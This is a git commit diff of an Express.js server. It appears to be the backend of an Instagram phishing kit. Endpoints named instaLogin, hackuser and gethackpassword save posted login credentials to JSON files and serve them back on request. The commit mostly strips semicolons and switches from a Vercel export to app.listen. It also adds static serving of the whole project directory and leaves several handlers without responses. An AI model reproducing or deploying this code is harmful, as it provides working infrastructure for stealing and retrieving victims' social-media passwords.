3824b3ffd9714d957f60bec2a117b21b516c149a
Saad Baig <158547083+saadb113@users.noreply.github.com>
2025-01-01 11:41:15 +0500

    Update index.js

--- index.js
+++ index.js
@@ -1,29 +1,30 @@
-const express = require("express");
-const app = express();
-const path = require("path");
+const express = require("express")
+const app = express()
+const path = require("path")
 const multer = require('multer');
-const cors = require("cors");
-const fs = require("fs");
+const cors = require("cors")
+const fs = require("fs")
 
-app.use(express.json());
-app.use(express.static(path.join(__dirname, "./uploads"))); // Correct path for static files
-app.use(cors());
+app.use(express.json())
+app.use(express.static(path.join(__dirname, "./uploads")))
+app.use(cors())
 
 function writeToJSONFile(data, filename) {
-  const filepath = `./Data/${filename}.json`;
+  const filepath = `./Data/${filename}.json`
   const jsonData = fs.readFileSync(filepath, 'utf8');
-  const parsedData = JSON.parse(jsonData);
-  const appendedData = [...parsedData, data];
+  const parsedData = JSON.parse(jsonData)
+  const appendedData = [...parsedData, data]
   fs.writeFileSync(filepath, JSON.stringify(appendedData, null, 2));
 }
 
 function readFromJSONFile(filename) {
-  const filepath = `./Data/${filename}.json`;
+  const filepath = `./Data/${filename}.json`
   const jsonData = fs.readFileSync(filepath, 'utf8');
   return JSON.parse(jsonData);
 }
 
-let dpname = "";
+
+let dpname = ""
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     cb(null, 'uploads/'); // Destination folder for uploaded files
@@ -31,70 +32,71 @@ const storage = multer.diskStorage({
   filename: function (req, file, cb) {
     const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
     const fileExtension = path.extname(file.originalname);
-    dpname = file.fieldname + '-' + uniqueSuffix + fileExtension;
-    cb(null, dpname);
+    dpname = file.fieldname + '-' + uniqueSuffix + fileExtension
+    cb(null, file.fieldname + '-' + uniqueSuffix + fileExtension);
   }
 });
 
 const upload = multer({ storage: storage });
 
+app.use(express.static(__dirname))
+
+
+
 app.post("/instaLogin", async (req, res) => {
-  writeToJSONFile(req.body, 'InstaLogins');
-  res.status(200).json({ message: 'Data saved successfully!' });
-});
+    writeToJSONFile(req.body, 'InstaLogins')
+})
 
 app.post("/hackuser", async (req, res) => {
-  const users = readFromJSONFile('hackUname');
-  const filter = users.find(element => element.username === req.body.username);
-  if (!filter) {
-    writeToJSONFile(req.body, 'hackUname');
-    res.status(200).json({ message: 'User saved!' });
-  } else {
-    res.status(400).json({ message: 'User already exists!' });
-  }
-});
-
-app.post("/gethackpassword", async (req, res) => {
-  const { username } = req.body;
-  const data = readFromJSONFile('hackUname');
-  const filter = data.find(element => element.username === username);
+  const users = readFromJSONFile('hackUname')
+  const filter = users.find(element => element.username === req.body.username)
   if (filter) {
-    res.json({ data: filter.password });
   } else {
-    res.json({ data: false });
+    writeToJSONFile(req.body, 'hackUname')
   }
-});
+
+})
+app.post("/gethackpassword", async (req, res) => {
+  const { username } = req.body
+  const data = readFromJSONFile('hackUname')
+  const filter = data.find(element => element.username === username)
+  if (filter) {
+    res.json({ data: filter.password })
+  } else {
+    res.json({ data: false })
+  }
+
+})
+
 
 app.get("/instaLogins", async (req, res) => {
-  const users = readFromJSONFile('InstaLogins');
-  res.json({ data: users });
-});
-
+  const users = readFromJSONFile('InstaLogins')
+  res.json({ data: users })
+})
 app.get("/hackUsers", async (req, res) => {
-  const users = readFromJSONFile('hackUname');
-  res.json({ data: users });
-});
+  const users = readFromJSONFile('hackUname')
+  res.json({ data: users })
+})
+
 
 app.post("/addrecentuser", upload.single('dp'), (req, res) => {
-  const { name, username, url, from, to } = req.body;
-  const data = { name, username, url, from, to, dp: dpname };
-  const users = readFromJSONFile('recentUsers');
-  const userExists = users.some(element => element.username == username);
-
-  if (!userExists) {
-    writeToJSONFile(data, 'recentUsers');
-    res.status(200).json({ message: 'User added to recent users' });
-  } else {
-    res.status(400).json({ message: 'User already exists' });
-  }
-});
-
+  const { name, username, url, from, to } = req.body
+  const data = { name, username, url, from, to, dp: dpname }
+  const users = readFromJSONFile('recentUsers')
+  users.forEach(element => {
+    if (element.username == username) {
+      return
+    } else {
+      writeToJSONFile(data, 'recentUsers')
+    }
+  });
+})
 app.get("/getrecentusers", async (req, res) => {
-  const data = readFromJSONFile('recentUsers');
-  res.json({ data });
-});
+  const data = readFromJSONFile('recentUsers')
+  res.json({ data })
+})
 
-// Export the Express app as the handler for Vercel
-module.exports = (req, res) => {
-  app(req, res);  // Use the express app to handle the request
-};
+
+app.listen(3000, () => {
+  console.log("server Started")
+})
